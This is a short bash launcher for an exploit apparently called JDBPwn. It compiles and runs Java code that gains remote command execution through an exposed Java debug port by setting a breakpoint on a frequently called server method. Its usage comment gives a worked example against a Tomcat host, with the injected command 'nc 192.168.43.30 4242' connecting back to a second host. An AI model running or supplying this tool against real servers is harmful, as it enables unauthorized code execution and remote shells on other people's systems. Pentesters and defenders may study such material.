#!/bin/bash
# usage:
# ./run.sh <RHOST> <RPORT> <method> <cmd>
#		<method> should be a frequently used method in the target application 
#		on the remote server where a breakpoint will be inserted
# Ex: (tomcat6)
# ./run.sh 192.168.43.45 8000 org.apache.catalina.startup.HostConfig.appBase "nc 192.168.43.30 4242"
#

JDK="/usr/lib/jvm/java-7-openjdk"

rm *.class
javac -classpath "${JDK}/lib/tools.jar" RemoteDebug.java
javac JDBPwn.java
java -classpath .:"${JDK}/lib/tools.jar" JDBPwn "$@"
